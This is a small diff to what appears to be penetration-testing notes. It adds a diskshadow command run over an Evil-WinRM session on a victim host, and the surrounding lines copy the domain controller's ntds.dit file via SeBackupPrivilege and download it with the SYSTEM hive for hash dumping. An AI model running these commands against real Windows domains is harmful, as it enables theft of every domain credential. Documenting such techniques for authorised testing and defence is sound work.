@@ -353,6 +353,7 @@ $ unix2dos vss.dsh
 Use diskshadow to explore the func of copy and after that download ntds.dit | SYSTEM hive on our attack host for dumping
 ```
 [Victim host]
+*Evil-WinRM* PS C:\Windows\NTDS> diskshadow /s c:\\programdata\\vss.dsh
 *Evil-WinRM* PS C:\Windows\NTDS> Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\programdata\\ntds.dit
 
 [Attack host]
